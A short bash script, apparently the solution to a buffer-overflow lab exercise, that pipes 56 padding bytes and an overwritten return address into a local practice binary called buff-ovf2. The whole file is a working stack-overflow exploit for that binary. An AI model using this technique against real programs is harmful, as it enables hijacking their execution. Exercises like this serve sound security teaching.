#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*56 + b"\xf6\x11\x40\x00\x00\x00\x00\x00")' | ../support/buff-ovf2
